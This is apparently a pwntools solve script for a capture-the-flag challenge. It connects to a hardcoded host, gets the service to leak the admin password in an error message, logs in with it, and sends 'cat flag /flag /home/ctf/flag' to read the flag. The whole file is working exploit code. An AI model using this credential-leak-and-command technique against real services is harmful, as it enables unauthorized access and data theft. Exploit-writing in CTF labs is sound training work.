from pwn import *
import re
import sys

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-l 100']

host = sys.argv[1] if len(sys.argv) > 1 else "175.27.251.122"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 36113

io = remote(host, port)
sl = lambda x: io.sendline(x)
s  = lambda x: io.send(x)
rt = lambda x: io.recvuntil(x)
ri = lambda x: int(io.recv(x), 16)
it = lambda: io.interactive()
p  = lambda x:  pause()
#ret = 0x000000000040101a
#gdb.attach(io,"b *0x401F27")
rt(b">")
sl(b"2")
rt(b"Enter admin name:\n")
sl(b"admin")
rt(b"Enter admin password:\n")
sl(b"1")
rt(b"The correct password is: ")
password = io.recvn(16)
print("Correct password: " + password.decode(errors="ignore"))
rt(b">")
sl(b"2")
rt(b"Enter admin name:\n")
sl(b"admin")
rt(b"Enter admin password:\n")
sl(password)
rt(b"Enter your command:\n")
sl(b"cat flag /flag /home/ctf/flag 2>/dev/null")
data = io.recvrepeat(2)
flag = re.search(rb"[A-Za-z0-9_]+\{[^}\n]+\}", data)

if flag:
    success("flag = " + flag.group(0).decode(errors="ignore"))
else:
    print(data.decode("latin1", "replace"))

io.close()
